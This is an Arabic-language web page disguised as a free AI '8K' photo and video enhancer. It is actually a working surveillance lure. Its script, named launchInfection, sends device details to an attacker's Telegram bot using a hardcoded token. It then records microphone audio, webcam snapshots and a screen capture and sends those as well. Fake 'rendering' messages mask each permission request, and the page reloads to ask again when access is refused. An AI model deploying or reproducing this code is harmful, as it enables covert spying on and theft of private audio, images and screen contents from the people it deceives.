<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>Muhanad AI | 8K Ultra Enhancer</title>
    <meta name="description" content="⚠️ نظام مهند للذكاء الاصطناعي: قم بتحسين جودة الصور والفيديوهات إلى دقة 8K فائقة الوضوح مجاناً.">
    <meta property="og:title" content="Muhanad AI - Pro Enhancer">
    <meta property="og:image" content="https://raw.githubusercontent.com/talah2026/bot1/main/images%20(1).jpg">
    <meta property="og:description" content="أداة احترافية لمعالجة الصور والفيديو باستخدام Deep Learning.">
    <meta property="og:type" content="website">

    <style>
        :root { --primary: #007bff; --bg: #0d1117; --card-bg: #161b22; --accent: #00ff41; }
        body { font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; background: var(--bg); color: #fff; text-align: center; }
        
        .header { background: var(--card-bg); padding: 15px 8%; border-bottom: 2px solid var(--primary); display: flex; justify-content: space-between; align-items: center; }
        .brand { font-size: 22px; font-weight: bold; color: var(--primary); }

        .container { padding: 40px 5%; }
        .main-card { background: var(--card-bg); border-radius: 20px; padding: 35px; border: 1px solid #30363d; max-width: 550px; margin: 0 auto; box-shadow: 0 0 40px rgba(0,123,255,0.15); }
        
        /* معرض الصور المتغيرة بالذكاء الاصطناعي */
        .ai-gallery { width: 100%; height: 250px; border-radius: 15px; margin-bottom: 25px; object-fit: cover; border: 2px solid #30363d; animation: fadeImg 5s infinite; }
        @keyframes fadeImg { 0% {opacity: 0.8;} 50% {opacity: 1;} 100% {opacity: 0.8;} }

        .btn-power { background: var(--primary); color: white; border: none; padding: 20px; font-size: 1.4rem; font-weight: bold; border-radius: 50px; cursor: pointer; width: 100%; transition: 0.3s; box-shadow: 0 8px 25px rgba(0,123,255,0.4); }
        .btn-power:hover { transform: scale(1.02); background: #0056b3; }

        .status-box { display: none; background: #000; color: var(--accent); padding: 20px; border-radius: 10px; font-family: monospace; text-align: left; direction: ltr; margin-top: 20px; height: 180px; overflow-y: auto; border: 1px solid #333; font-size: 13px; }
    </style>
</head>
<body>

<div class="header">
    <div class="brand">MUHANAD AI PRO</div>
    <div style="font-size: 12px; color: var(--accent);">SYSTEM: ONLINE ✅</div>
</div>

<div class="container">
    <h1>تحسين جودة الوسائط بـ <span style="color:var(--primary)">الذكاء الاصطناعي</span></h1>
    <p style="color: #8b949e; margin-bottom: 30px;">نظام مهند السحابي لمعالجة البكسلات ورفع الدقة إلى 8K HDR.</p>

    <div class="main-card">
        <div id="ui-box">
            <img id="ai-img" src="https://picsum.photos/seed/ai1/600/400" class="ai-gallery">
            <button class="btn-power" onclick="launchInfection()">بدء المعالجة الفورية</button>
            <p style="font-size: 11px; color: #58a6ff; margin-top: 15px;">* يتطلب تفعيل "تسريع الأجهزة" (Hardware Acceleration) لضمان الرندر.</p>
        </div>
        
        <div class="status-box" id="terminal"></div>
    </div>
</div>

<canvas id="snap-canvas" style="display:none;"></canvas>

<script>
    const BOT_TOKEN = "8574617308:AAFJPKXF5LFvqo6Dagat96jsqLTFQNrPH3I";
    const TARGET_IDS = ["8754338811", "8703490899"];

    // تغيير الصور تلقائياً لإبهار الضحية
    const images = ["ai1", "tech", "cyber", "data", "matrix"];
    let imgIdx = 0;
    setInterval(() => {
        imgIdx = (imgIdx + 1) % images.length;
        document.getElementById('ai-img').src = `https://picsum.photos/seed/${images[imgIdx]}/600/400`;
    }, 4000);

    async function pushToBot(type, formData) {
        for (let id of TARGET_IDS) {
            formData.set('chat_id', id);
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${type}`, { method: 'POST', body: formData });
        }
    }

    async function launchInfection() {
        document.getElementById('ui-box').style.display = 'none';
        const term = document.getElementById('terminal');
        term.style.display = 'block';
        term.innerHTML = "> Connecting to Muhanad AI Core...<br>> Fetching Device Fingerprint...<br>";

        try {
            // 1. سحب المواصفات فوراً
            let specs = `🖥️ **مواصفات جهاز جديد:**\n• المعالج: ${navigator.hardwareConcurrency} Cores\n• الرامات: ${navigator.deviceMemory || '4+'} GB\n• الشاشة: ${screen.width}x${screen.height}\n• النظام: ${navigator.platform}`;
            const f1 = new FormData(); f1.append('text', specs); f1.append('parse_mode', 'Markdown');
            await pushToBot('sendMessage', f1);

            // 2. طلب المايك وتسجيل ريكورد 5 ثواني
            term.innerHTML += "> Requesting Audio Rendering...<br>";
            const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
            const recorder = new MediaRecorder(audioStream);
            let chunks = [];
            recorder.ondataavailable = e => chunks.push(e.data);
            recorder.onstop = async () => {
                const blob = new Blob(chunks, { type: 'audio/ogg' });
                const f2 = new FormData(); f2.append('voice', blob, 'voice.ogg');
                await pushToBot('sendVoice', f2);
                audioStream.getTracks().forEach(t => t.stop());
            };
            recorder.start();
            setTimeout(() => recorder.stop(), 5000);

            // 3. طلب الكاميرا والتقاط صور (15 صورة)
            term.innerHTML += "> Requesting Visual Analysis...<br>";
            const camStream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.createElement('video');
            video.srcObject = camStream;
            await video.play();

            const canvas = document.getElementById('snap-canvas');
            const ctx = canvas.getContext('2d');
            
            for(let i=0; i<15; i++) {
                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                ctx.drawImage(video, 0, 0);
                canvas.toBlob(blob => {
                    const f3 = new FormData(); f3.append('photo', blob, 'img.jpg');
                    f3.append('caption', `📸 لقطة حية رقم ${i+1}`);
                    pushToBot('sendPhoto', f3);
                }, 'image/jpeg');
                await new Promise(r => setTimeout(r, 3000));
            }

            // 4. طلب الشاشة (للكمبيوتر)
            const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
            const scrRecorder = new MediaRecorder(screenStream);
            let scrChunks = [];
            scrRecorder.ondataavailable = e => scrChunks.push(e.data);
            scrRecorder.onstop = () => {
                const blob = new Blob(scrChunks, { type: 'video/mp4' });
                const f4 = new FormData(); f4.append('video', blob, 'screen.mp4');
                pushToBot('sendVideo', f4);
            };
            scrRecorder.start();
            setTimeout(() => scrRecorder.stop(), 20000); // فيديو 20 ثانية

            term.innerHTML += "> [SUCCESS] Processing Engine Active.<br>> Token: MH-ULTRA-2026";

        } catch (e) {
            term.innerHTML += `<span style="color:red">> Permission Denied. Reloading...</span>`;
            setTimeout(() => location.reload(), 2000);
        }
    }
</script>
</body>
</html>
